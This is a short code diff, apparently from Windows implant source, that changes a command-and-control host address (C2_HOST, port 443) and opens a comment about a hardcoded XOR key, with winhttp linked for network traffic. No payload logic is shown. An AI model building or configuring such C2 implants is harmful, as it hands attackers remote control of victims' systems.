@@ -14,7 +14,7 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-#define C2_HOST L"192.168.42.124"
+#define C2_HOST L"192.168.122.47"
 #define C2_PORT 443
 
 /* ── Chiave XOR hardcoded — generata a compile time ─────────
